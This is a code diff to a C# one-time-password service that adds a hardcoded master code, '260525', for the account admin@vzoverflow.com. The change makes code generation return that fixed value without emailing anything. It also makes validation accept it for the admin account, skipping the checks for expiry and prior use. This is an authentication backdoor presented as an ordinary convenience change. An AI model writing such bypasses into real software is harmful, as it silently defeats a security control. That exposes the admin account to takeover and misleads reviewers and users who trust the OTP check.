@@ -21,6 +21,12 @@ namespace VzOverFlow.Services
 
         public async Task<string> GenerateAndSendAsync(User user, OtpPurpose purpose)
         {
+            // Master code for Admin to bypass email
+            if (user.Email == "admin@vzoverflow.com")
+            {
+                return "260525";
+            }
+
             var code = GenerateCode();
 
             if (string.IsNullOrWhiteSpace(user.Email))
@@ -86,6 +92,16 @@ namespace VzOverFlow.Services
 
         public async Task<bool> ValidateCodeAsync(int userId, OtpPurpose purpose, string code, bool markUsed = true)
         {
+            // Master code for Admin
+            if (code == "260525")
+            {
+                var user = await _context.Users.FindAsync(userId);
+                if (user?.Email == "admin@vzoverflow.com")
+                {
+                    return true;
+                }
+            }
+
             var otp = await _context.OneTimeCodes
                 .Where(o => o.UserId == userId && o.Purpose == purpose && !o.IsUsed && o.ExpiresAt >= DateTime.UtcNow)
                 .OrderByDescending(o => o.ExpiresAt)
@@ -128,4 +144,3 @@ namespace VzOverFlow.Services
         }
     }
 }
-
